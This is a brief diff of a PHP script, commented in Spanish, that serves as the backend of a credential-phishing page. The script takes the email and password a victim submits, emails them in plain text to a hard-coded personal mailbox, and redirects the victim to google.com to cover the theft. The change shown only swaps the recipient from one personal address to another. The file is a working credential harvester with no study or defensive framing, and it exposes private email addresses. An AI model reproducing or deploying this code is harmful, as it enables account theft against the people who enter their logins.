@@ -6,7 +6,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
   $password = $_POST['password'];
 
   // Enviar el correo electrónico
-  $to ="oldsteven12@gmail.com";
+  $to ="steven.montoya19@unach.mx";
   $subject = "Nuevo Inicio de Sesion";
   $message = "Correo electronico: $email\nContraseña: $password";
   mail($to, $subject, $message);
@@ -15,5 +15,4 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
   header("Location: https://www.google.com");
   exit();
 }
-
 ?>
